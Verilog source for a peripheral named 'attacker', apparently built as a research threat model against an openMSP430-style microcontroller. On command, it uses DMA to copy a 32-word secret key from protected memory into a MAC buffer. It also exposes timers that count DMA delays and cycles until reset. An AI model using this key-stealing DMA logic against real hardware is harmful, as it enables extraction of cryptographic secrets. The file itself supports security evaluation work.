module attacker (

// OUTPUTs
    per_dout,                       // Peripheral data output
    dma_addr,
    dma_en,
    dma_din,
    dma_we,

// INPUTs
    mclk,                           // Main system clock
    per_addr,                       // Peripheral address
    per_din,                        // Peripheral data input
    per_en,                         // Peripheral enable (high active)
    per_we,                         // Peripheral write enable (high active)
    puc_rst,                        // Main system reset
    dma_ready,
    dma_dout
);

// OUTPUTs
//=========
output      [15:0] per_dout;        // Peripheral data output
output             dma_en;
output      [15:1] dma_addr;
output      [15:0] dma_din;         // Direct Memory Access data input
output       [1:0] dma_we;

// INPUTs
//=========
input              mclk;            // Main system clock
input       [13:0] per_addr;        // Peripheral address
input       [15:0] per_din;         // Peripheral data input
input              per_en;          // Peripheral enable (high active)
input        [1:0] per_we;          // Peripheral write enable (high active)
input              puc_rst;         // Main system reset
input              dma_ready;       // DMA ready
input       [15:0] dma_dout;        // DMA data out

//=============================================================================
// 1)  PARAMETER DECLARATION
//=============================================================================

// Register base address (must be aligned to decoder bit width)
parameter       [14:0] BASE_ADDR   = 15'h0070;

// Decoder bit width (defines how many bits are considered for address decoding)
parameter              DEC_WD      =  4;

// Register addresses offset
parameter [DEC_WD-1:0] ATT_STEAL_KEY       =  'h0,
                       ATT_PERSISTENT_FLAG =  'h2,
                       ATT_CNT_UNTIL_RESET =  'h4,
                       ATT_DMA_COUNTDOWN   =  'h6,
                       ATT_DMA_DELAYED     =  'h8;


// Register one-hot decoder utilities
parameter              DEC_SZ      =  (1 << DEC_WD);
parameter [DEC_SZ-1:0] BASE_REG    =  {{DEC_SZ-1{1'b0}}, 1'b1};

// Register one-hot decoder
parameter [DEC_SZ-1:0] ATT_STEAL_KEY_D       = (BASE_REG << ATT_STEAL_KEY),
                       ATT_PERSISTENT_FLAG_D = (BASE_REG << ATT_PERSISTENT_FLAG),
                       ATT_CNT_UNTIL_RESET_D = (BASE_REG << ATT_CNT_UNTIL_RESET),
                       ATT_DMA_COUNTDOWN_D   = (BASE_REG << ATT_DMA_COUNTDOWN),
                       ATT_DMA_DELAYED_D     = (BASE_REG << ATT_DMA_DELAYED);


//============================================================================
// 2)  REGISTER DECODER
//============================================================================

// Local register selection
wire              reg_sel   =  per_en & (per_addr[13:DEC_WD-1]==BASE_ADDR[14:DEC_WD]);

// Register local address
wire [DEC_WD-1:0] reg_addr  =  {per_addr[DEC_WD-2:0], 1'b0};

// Register address decode
wire [DEC_SZ-1:0] reg_dec = (ATT_STEAL_KEY_D       & {DEC_SZ{(reg_addr==ATT_STEAL_KEY)}}) |
                            (ATT_PERSISTENT_FLAG_D & {DEC_SZ{(reg_addr==ATT_PERSISTENT_FLAG)}}) |
                            (ATT_CNT_UNTIL_RESET_D & {DEC_SZ{(reg_addr==ATT_CNT_UNTIL_RESET)}}) |
                            (ATT_DMA_COUNTDOWN_D   & {DEC_SZ{(reg_addr==ATT_DMA_COUNTDOWN)}}) |
                            (ATT_DMA_DELAYED_D     & {DEC_SZ{(reg_addr==ATT_DMA_DELAYED)}});

// Read/Write probes
wire              reg_write =  |per_we & reg_sel;
wire              reg_read  = ~|per_we & reg_sel;

// Read/Write vectors
wire [DEC_SZ-1:0] reg_wr    = reg_dec & {DEC_SZ{reg_write}};
wire [DEC_SZ-1:0] reg_rd    = reg_dec & {DEC_SZ{reg_read}};


//============================================================================
// 3) REGISTERS
//============================================================================

wire steal_key = reg_wr[ATT_STEAL_KEY];
wire flag_read = reg_rd[ATT_PERSISTENT_FLAG];
wire cnt_until_reset = reg_wr[ATT_CNT_UNTIL_RESET];
wire dma_countdown_start = reg_wr[ATT_DMA_COUNTDOWN];

reg dma_countdown_active = 1'b0;
reg [15:0] dma_countdown = 16'h0;
reg [2:0] dma_countdown_secondary = 3'h0;
reg dma_delayed = 1'b0;

reg counting_until_reset = 1'b0;
reg [15:0] cycles_until_reset = 16'h0;

reg flag_value = 1'b0;

wire [15:0] delay_output = dma_delayed & {16{reg_rd[ATT_DMA_DELAYED]}};
wire [15:0] cnt_output = cycles_until_reset & {16{reg_rd[ATT_CNT_UNTIL_RESET]}};
wire [15:0] flag_output = flag_value & {16{reg_rd[ATT_PERSISTENT_FLAG]}};

wire [15:0] per_dout   =  delay_output | flag_output | cnt_output;

reg [15:0] dma_din    =  16'h0;

reg  [15:1] dma_addr = 15'h0;
reg         dma_en   = 1'b0;
reg  [1:0]  dma_we   = 2'b00;

parameter [15:0] MAC_ADDR = 16'h0230;
parameter [15:0] KEY_ADDR = 16'h6A00;

reg [15:0] cycle_countdown = 16'h0;
reg [511:0] key_buffer = 16'h0;

always @ (posedge mclk or posedge puc_rst) begin
  if (dma_countdown_start) begin
      dma_countdown_active <= 1'b1;
      dma_countdown <= per_din;
  end
  if (flag_read) begin
      flag_value <= 1'b1;
  end
  if (cnt_until_reset) begin
      counting_until_reset <= 1'b1;
      cycles_until_reset <= 16'h0;
  end
  if (puc_rst) begin
      cycle_countdown <=  16'hFFFF;
      counting_until_reset <= 1'b0;
      dma_countdown_active <= 1'b0;
  end
  else begin
    dma_en <= (dma_countdown_active && dma_countdown == 16'h0) || cycle_countdown != 16'hFFFF;

    if (counting_until_reset) begin
        cycles_until_reset <= cycles_until_reset + 1;
    end
    if (dma_countdown_active) begin
        dma_countdown_secondary <= dma_countdown_secondary + 1;
        if (dma_countdown_secondary == 3'b111) begin
            dma_countdown <= dma_countdown - 1;
        end
        if (dma_countdown == 16'h0) begin
            dma_addr <= MAC_ADDR;
            dma_we <= 2'b00;
            dma_delayed <= ~dma_ready;
        end
    end
    if (steal_key) begin
        cycle_countdown <= 16'd65;
    end
    else begin
        case (cycle_countdown)
            16'hFFFF: begin
                // do nothing
            end
            default: begin
                cycle_countdown <= cycle_countdown - 16'h1;
                if (cycle_countdown > 31) begin
                    dma_addr <= (KEY_ADDR >> 1) + 65 - cycle_countdown;
                    dma_we <= 2'b00;
                    key_buffer <= {key_buffer[495:0], dma_dout};
                end
                else begin
                    dma_addr <= (MAC_ADDR >> 1) + (31 - cycle_countdown);
                    dma_din <= key_buffer >> (16 * (cycle_countdown));
                    dma_we <= 2'b11;
                end
            end
        endcase
    end
  end
end

endmodule
